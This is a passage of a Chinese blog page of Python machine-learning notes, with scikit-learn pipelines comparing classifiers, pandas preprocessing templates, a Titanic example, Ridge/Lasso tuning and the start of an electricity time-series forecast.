standardization</span></span><br><span class="line">steps.append((<span class="string">&#x27;standardize&#x27;</span>, StandardScaler()))</span><br><span class="line"><span class="comment"># normalization</span></span><br><span class="line">steps.append((<span class="string">&#x27;normalize&#x27;</span>, MinMaxScaler()))</span><br><span class="line"><span class="comment"># the model</span></span><br><span class="line">steps.append((<span class="string">&#x27;model&#x27;</span>, model))</span><br><span class="line"><span class="comment"># create pipeline</span></span><br><span class="line">pipeline = Pipeline(steps).fit(Xtrain,Ytrain)</span><br><span class="line"><span class="keyword">return</span> pipeline.score(Xtest,Ytest)</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">models = get_models()</span><br><span class="line"><span class="keyword">for</span> name, model <span class="keyword">in</span> models.items():</span><br><span class="line">    dic[name] = make_pipeline(model,Xtrain,Ytrain,Xtest,Ytest)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;model %s is done,score is %f&#x27;</span>%(name,dic[name]))</span><br><span class="line">order=<span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2><span id="模板">模板</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">df.describe([<span class="number">0.01</span>,<span class="number">0.05</span>,<span class="number">0.1</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.75</span>,<span class="number">0.9</span>,<span class="number">0.99</span>]).T</span><br><span class="line">df.describe(include=[<span class="string">&#x27;O&#x27;</span>])</span><br><span class="line"><span class="comment"># 提取连续，离散的数据</span></span><br><span class="line">col = df.columns.tolist()</span><br><span class="line">cate = df.columns[df.dtypes == <span class="string">&quot;object&quot;</span>].tolist()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cate:</span><br><span class="line">    col.remove(i)</span><br><span class="line"><span class="comment"># 转换</span></span><br><span class="line">df[<span class="string">&#x27;a&#x27;</span>] = df[<span class="string">&#x27;a&#x27;</span>].replace(<span class="string">&#x27;[\$,)]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,regex=<span class="literal">True</span>).astype(<span class="built_in">float</span>)</span><br><span class="line"><span class="comment"># 离散一般填众数，连续填均值</span></span><br><span class="line">df[<span class="string">&#x27;b&#x27;</span>]=df[<span class="string">&#x27;b&#x27;</span>].fillna(df.b.mean())</span><br><span class="line">df[<span class="string">&#x27;c&#x27;</span>]=df[<span class="string">&#x27;c&#x27;</span>].fillna(df.b.mode()[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># 哑变量操作</span></span><br><span class="line">cate = df.columns[df.dtypes == <span class="string">&quot;object&quot;</span>].tolist()</span><br><span class="line">cate</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cate:</span><br><span class="line">    df = pd.concat([df,pd.get_dummies(df[c],prefix=<span class="built_in">str</span>(c))],axis=<span class="number">1</span>)</span><br><span class="line">    df.drop(c,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量操作</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getTitle</span>(<span class="params">name</span>):</span><br><span class="line">    str1=name.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>]   <span class="comment">#取头衔.姓</span></span><br><span class="line">    str2=str1.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]   <span class="comment">#取头衔</span></span><br><span class="line">    <span class="comment">#strip() 移除字符串头尾指定的字符</span></span><br><span class="line">    str3=str2.strip()</span><br><span class="line">    <span class="keyword">return</span> str3</span><br><span class="line">titleDf = pd.DataFrame()</span><br><span class="line"><span class="comment">#map方法---对series里面每个数据应用自定义函数计算</span></span><br><span class="line">titleDf[<span class="string">&#x27;Title&#x27;</span>] = full[<span class="string">&#x27;Name&#x27;</span>].<span class="built_in">map</span>(getTitle)</span><br><span class="line"><span class="comment"># 根据其他列数据新建onehot</span></span><br><span class="line">df[<span class="string">&#x27;month&#x27;</span>] = df[<span class="string">&#x27;Date&#x27;</span>].dt.month</span><br><span class="line">familyDf = pd.DataFrame()</span><br><span class="line">familyDf[<span class="string">&#x27;FamilySize&#x27;</span>] = full[<span class="string">&#x27;Parch&#x27;</span>]+full[<span class="string">&#x27;SibSp&#x27;</span>]+<span class="number">1</span></span><br><span class="line">familyDf[<span class="string">&#x27;Family_Single&#x27;</span>] = familyDf[<span class="string">&#x27;FamilySize&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> s : <span class="number">1</span> <span class="keyword">if</span> s == <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> )</span><br><span class="line">familyDf[<span class="string">&#x27;Family_Small&#x27;</span>] = familyDf[<span class="string">&#x27;FamilySize&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> s : <span class="number">1</span> <span class="keyword">if</span> <span class="number">2</span>&lt;= s &lt;= <span class="number">4</span> <span class="keyword">else</span> <span class="number">0</span> )</span><br><span class="line">familyDf[<span class="string">&#x27;Family_Large&#x27;</span>] = familyDf[<span class="string">&#x27;FamilySize&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> s : <span class="number">1</span> <span class="keyword">if</span> <span class="number">5</span>&lt;= s <span class="keyword">else</span> <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看相关性</span></span><br><span class="line">corrDf = full.corr()</span><br><span class="line">survived_rel=corrDf[<span class="string">&#x27;Survived&#x27;</span>].sort_values(ascending = <span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="泰坦尼克">泰坦尼克</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">train = pd.read_csv(<span class="string">&#x27;train.csv&#x27;</span>)</span><br><span class="line">test = pd.read_csv(<span class="string">&#x27;test.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line">train.head()</span><br><span class="line"></span><br><span class="line">train.info()</span><br><span class="line"></span><br><span class="line">train.describe([<span class="number">0.01</span>,<span class="number">0.1</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.75</span>,<span class="number">0.9</span>,<span class="number">0.99</span>]).T</span><br><span class="line"></span><br><span class="line">train.isna().<span class="built_in">sum</span>()</span><br><span class="line"></span><br><span class="line">train.Age.fillna(train.Age.mean(),inplace=<span class="literal">True</span>)</span><br><span class="line">train[<span class="string">&#x27;Embarked&#x27;</span>].fillna(train.Embarked.mode()[<span class="number">0</span>],inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">train.Cabin.value_counts()</span><br><span class="line"></span><br><span class="line">train.Cabin.fillna(<span class="string">&#x27;Unknown&#x27;</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">train.set_index(<span class="string">&#x27;PassengerId&#x27;</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">train[<span class="string">&#x27;FamilySize&#x27;</span>] = train[<span class="string">&#x27;SibSp&#x27;</span>]+train[<span class="string">&#x27;Parch&#x27;</span>]+<span class="number">1</span></span><br><span class="line">train.drop([<span class="string">&#x27;SibSp&#x27;</span>,<span class="string">&#x27;Parch&#x27;</span>],axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">train.Cabin = train.Cabin.<span class="built_in">map</span>(<span class="keyword">lambda</span> x : x[<span class="number">0</span>])</span><br><span class="line">train.Cabin.value_counts()</span><br><span class="line"></span><br><span class="line">train[<span class="string">&#x27;Name&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]).value_counts()</span><br><span class="line">train[<span class="string">&#x27;Name&#x27;</span>]=train[<span class="string">&#x27;Name&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">train.drop(<span class="string">&#x27;Ticket&#x27;</span>,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">col = train.columns[train.dtypes == <span class="string">&quot;object&quot;</span>].tolist()</span><br><span class="line">col</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> col:</span><br><span class="line">    train = pd.concat([train,pd.get_dummies(train[c],prefix=<span class="built_in">str</span>(c))],axis=<span class="number">1</span>)</span><br><span class="line">    train.drop(c,inplace=<span class="literal">True</span>,axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">corrDf = train.corr()</span><br><span class="line">survived_rel=corrDf[<span class="string">&#x27;Survived&#x27;</span>].sort_values(ascending = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">Ytrain = train[<span class="string">&#x27;Survived&#x27;</span>]</span><br><span class="line">Xtrain = train.drop(<span class="string">&#x27;Survived&#x27;</span>,axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">%%time</span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> Pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> GradientBoostingClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> LinearSVC</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression,  SGDClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># prepare a list of ml models</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_models</span>(<span class="params">models=<span class="built_in">dict</span>(<span class="params"></span>)</span>):</span><br><span class="line">    <span class="comment"># linear models</span></span><br><span class="line">    models[<span class="string">&#x27;gbc&#x27;</span>] = GradientBoostingClassifier()</span><br><span class="line">    models[<span class="string">&#x27;rfc&#x27;</span>] = RandomForestClassifier()</span><br><span class="line">    models[<span class="string">&#x27;lr&#x27;</span>] = LogisticRegression()</span><br><span class="line">    models[<span class="string">&#x27;KNN&#x27;</span>] = KNeighborsClassifier()</span><br><span class="line">    models[<span class="string">&#x27;GaussianNB&#x27;</span>] =  GaussianNB()</span><br><span class="line">    models[<span class="string">&#x27;sgd&#x27;</span>] = SGDClassifier()</span><br><span class="line">    models[<span class="string">&#x27;lsvc&#x27;</span>] =LinearSVC()</span><br><span class="line">    models[<span class="string">&#x27;svc&#x27;</span>] = SVC()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Defined %d models&#x27;</span> % <span class="built_in">len</span>(models))</span><br><span class="line">    <span class="keyword">return</span> models</span><br><span class="line"><span class="comment"># create a feature preparation pipeline for a model</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pipeline</span>(<span class="params">model,X, Y</span>):</span><br><span class="line">    steps = <span class="built_in">list</span>()</span><br><span class="line">    <span class="comment"># standardization</span></span><br><span class="line">    steps.append((<span class="string">&#x27;standardize&#x27;</span>, StandardScaler()))</span><br><span class="line">    <span class="comment"># normalization</span></span><br><span class="line">    steps.append((<span class="string">&#x27;normalize&#x27;</span>, MinMaxScaler()))</span><br><span class="line">    <span class="comment"># the model</span></span><br><span class="line">    steps.append((<span class="string">&#x27;model&#x27;</span>, model))</span><br><span class="line">    <span class="comment"># create pipeline</span></span><br><span class="line">    pipeline = Pipeline(steps)</span><br><span class="line">    <span class="keyword">return</span> cross_val_score(pipeline,X,Y,cv=<span class="number">4</span>).mean()</span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">models = get_models()</span><br><span class="line"><span class="keyword">for</span> name, model <span class="keyword">in</span> models.items():</span><br><span class="line">    dic[name] = make_pipeline(model,Xtrain,Ytrain)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;model %s is done,score is %f&#x27;</span>%(name,dic[name]))</span><br><span class="line">order=<span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plot_data = pd.DataFrame(data=order)</span><br><span class="line">plot_data.columns = [<span class="string">&#x27;algo&#x27;</span>,<span class="string">&#x27;score&#x27;</span>]</span><br><span class="line">plot_data.set_index(<span class="string">&#x27;algo&#x27;</span>).plot.bar(figsize=(<span class="number">10</span>,<span class="number">6</span>))</span><br><span class="line">plt.xticks(rotation=<span class="number">360</span>)</span><br><span class="line"><span class="string">f&#x27;%s is the best,score is %f&#x27;</span>%(order[<span class="number">0</span>][<span class="number">0</span>],order[<span class="number">0</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h3><span id="调优">调优</span></h3><p>岭回归可以解决特征间的精确相关关系导致的最小二乘法无法使用的问题，而Lasso不行。</p><p>由于Lasso对正则化系数的变动过于敏感，因此我们往往让 在很小的空间中变动</p><h3><span id="ridge">Ridge</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">housevalue = fch()</span><br><span class="line">X = pd.DataFrame(housevalue.data) y = housevalue.target</span><br><span class="line">X.columns = [<span class="string">&quot;住户收入中位数&quot;</span>,<span class="string">&quot;房屋使用年代中位数&quot;</span>,<span class="string">&quot;平均房间数目&quot;</span></span><br><span class="line">           ,<span class="string">&quot;平均卧室数目&quot;</span>,<span class="string">&quot;街区人口&quot;</span>,<span class="string">&quot;平均入住率&quot;</span>,<span class="string">&quot;街区的纬度&quot;</span>,<span class="string">&quot;街区的经度&quot;</span>]</span><br><span class="line">Ridge_ = RidgeCV(alphas=np.arange(<span class="number">1</span>,<span class="number">1001</span>,<span class="number">100</span>)</span><br><span class="line">                <span class="comment">#,scoring=&quot;neg_mean_squared_error&quot;</span></span><br><span class="line">                 ,store_cv_values=<span class="literal">True</span></span><br><span class="line">                <span class="comment">#,cv=5</span></span><br><span class="line">               ).fit(X, y)</span><br><span class="line"></span><br><span class="line">Ridge_.score(X,y) <span class="comment">#调用所有交叉验证的结果</span></span><br><span class="line">Ridge_.cv_values_.shape</span><br><span class="line"><span class="comment">#进行平均后可以查看每个正则化系数取值下的交叉验证结果</span></span><br><span class="line">Ridge_.cv_values_.mean(axis=<span class="number">0</span>) <span class="comment">#查看被选择出来的最佳正则化系数</span></span><br><span class="line">Ridge_.alpha_</span><br></pre></td></tr></table></figure><h3><span id="lasso">Lasso</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LassoCV</span><br><span class="line"><span class="comment">#自己建立Lasso进行alpha选择的范围</span></span><br><span class="line">alpharange = np.logspace(-<span class="number">10</span>, -<span class="number">2</span>, <span class="number">200</span>,base=<span class="number">10</span>) <span class="comment">#其实是形成10为底的指数函数</span></span><br><span class="line"><span class="comment">#10**(-10)到10**(-2)次方</span></span><br><span class="line">alpharange.shape</span><br><span class="line">Xtrain.head()</span><br><span class="line">lasso_ = LassoCV(alphas=alpharange <span class="comment">#自行输入的alpha的取值范围</span></span><br><span class="line">               ,cv=<span class="number">5</span> <span class="comment">#交叉验证的折数</span></span><br><span class="line">               ).fit(Xtrain, Ytrain) <span class="comment">#查看被选择出来的最佳正则化系数</span></span><br><span class="line">lasso_.alpha_</span><br><span class="line"><span class="comment">#调用所有交叉验证的结果</span></span><br><span class="line">lasso_.mse_path_</span><br><span class="line">lasso_.mse_path_.shape <span class="comment">#返回每个alpha下的五折交叉验证结果</span></span><br><span class="line">lasso_.mse_path_.mean(axis=<span class="number">1</span>) <span class="comment">#有注意到在岭回归中我们的轴向是axis=0吗？</span></span><br><span class="line"><span class="comment">#在岭回归当中，我们是留一验证，因此我们的交叉验证结果返回的是，每一个样本在每个alpha下的交叉验证结果</span></span><br><span class="line"><span class="comment">#因此我们要求每个alpha下的交叉验证均值，就是axis=0，跨行求均值</span></span><br><span class="line"><span class="comment">#而在这里，我们返回的是，每一个alpha取值下，每一折交叉验证的结果</span></span><br><span class="line"><span class="comment">#因此我们要求每个alpha下的交叉验证均值，就是axis=1，跨列求均值</span></span><br><span class="line"><span class="comment">#最佳正则化系数下获得的模型的系数结果</span></span><br><span class="line">lasso_.coef_</span><br><span class="line">lasso_.score(Xtest,Ytest) <span class="comment">#与线性回归相比如何？</span></span><br><span class="line">reg = LinearRegression().fit(Xtrain,Ytrain)</span><br><span class="line">reg.score(Xtest,Ytest) <span class="comment">#使用lassoCV自带的正则化路径长度和路径中的alpha个数来自动建立alpha选择的范围</span></span><br><span class="line">ls_ = LassoCV(eps=<span class="number">0.00001</span></span><br><span class="line">             ,n_alphas=<span class="number">300</span></span><br><span class="line">             ,cv=<span class="number">5</span></span><br><span class="line">               ).fit(Xtrain, Ytrain)</span><br><span class="line">ls_.alpha_</span><br><span class="line">ls_.alphas_ <span class="comment">#查看所有自动生成的alpha取值</span></span><br><span class="line">ls_.alphas_.shape</span><br><span class="line">ls_.score(Xtest,Ytest)</span><br><span class="line">ls_.coef_</span><br></pre></td></tr></table></figure><h3><span id="多步长时间序列">多步长时间序列</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line">pd.set_option(<span class="string">&#x27;display.max_columns&#x27;</span>, <span class="literal">None</span>) <span class="comment"># 展示所有列</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据处理</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;data.csv&#x27;</span>)</span><br><span class="line">df[<span class="string">&#x27;Date&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;Date&#x27;</span>])</span><br><span class="line">df[<span class="string">&#x27;month&#x27;</span>] = df[<span class="string">&#x27;Date&#x27;</span>].dt.month</span><br><span class="line">df[<span class="string">&#x27;dayofweek&#x27;</span>] = df[<span class="string">&#x27;Date&#x27;</span>].dt.dayofweek</span><br><span class="line">df[[<span class="string">&#x27;holiday&#x27;</span>,<span class="string">&#x27;month&#x27;</span>,<span class="string">&#x27;dayofweek&#x27;</span>]] = df[[<span class="string">&#x27;holiday&#x27;</span>,<span class="string">&#x27;month&#x27;</span>,<span class="string">&#x27;dayofweek&#x27;</span>]].astype(<span class="string">&#x27;object&#x27;</span>)</span><br><span class="line">df = pd.get_dummies(df)</span><br><span class="line">df.drop(<span class="string">&#x27;Season&#x27;</span>,inplace=<span class="literal">True</span>,axis=<span class="number">1</span>)</span><br><span class="line">df.info()</span><br><span class="line">df.set_index(<span class="string">&#x27;Date&#x27;</span>,inplace=<span class="literal">True</span>)</span><br><span class="line">data = df.copy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 相关函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_lag</span>(<span class="params">df,l_beg = <span class="number">1</span>,l_end = <span class="number">32</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l_beg,l_end):</span><br><span class="line">        df[<span class="string">&#x27;lag_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i)] = df.DailyElectricity.shift(i)</span><br><span class="line">    <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_data</span>(<span class="params">n_days,df,indx</span>):</span><br><span class="line">    Y_val = df.iloc[-n_days:,indx].copy()</span><br><span class="line">    df.iloc[-n_days:,indx]=<span class="number">0</span></span><br><span class="line">    make_lag(df)</span><br><span class="line">    X_val = df.iloc[-n_days:].drop(<span class="string">&#x27;DailyElectricity&#x27;</span>,axis=<span class="number">1</span>)</span><br><span class="line">    df.dropna(inplace=<span class="literal">True</span>)</span><br><span class="line">    X = df[:-n_days].drop(<span class="string">&#x27;DailyElectricity&#x27;</span>,axis=<span class="number">1</span>)</span><br><span class="line">    Y = df[:-n_days][<span class="string">&#x27;DailyElectricity&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> X,Y,X_val,Y_val</span><br><span class="line">  </span><br><span class="line">df = data.copy()</span><br><span class="line">X,Y,X_val,Y_val = split_data(<span class="number">365</span>,df,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> Pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> AdaBoostRegressor,RandomForestRegressor,GradientBoostingRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression,Lasso,LassoLars,SGDRegressor,Ridge</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_models</span>(<span class="params">models=&#123;&#125;</span>):</span><br><span class="line">    models[<span class="string">&#x27;AdaBoostRegressor&#x27;</span>]=AdaBoostRegressor()</span><br><span class="line">    models[<span class="string">&#x27;RandomForestRegressor&#x27;</span>]=RandomForestRegressor()</span><br><span class="line">    models[<span class="string">&#x27;GradientBoostingRegressor&#x27;</span>]=GradientBoostingRegressor()</span><br><span class="line">    models[<span class="string">&#x27;LinearRegression&#x27;</span>]=LinearRegression()</span><br><span class="line">    models[<span class="string">&#x27;Lasso&#x27;</span>]=Lasso()</span><br><span class="line">    models[<span class="string">&#x27;LassoLars&#x27;</span>]=LassoLars()</span><br><span class="line">    models[<span class="string">&#x27;SGDRegressor&#x27;</span>]=SGDRegressor()</span><br><span class="line">    models[<span class="string">&#x27;Ridge&#x27;</span>]=Ridge()</span><br><span class="line">    <span class="keyword">return</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pipe</span>(<span class="params">model</span>):</span><br><span class="line">    steps = 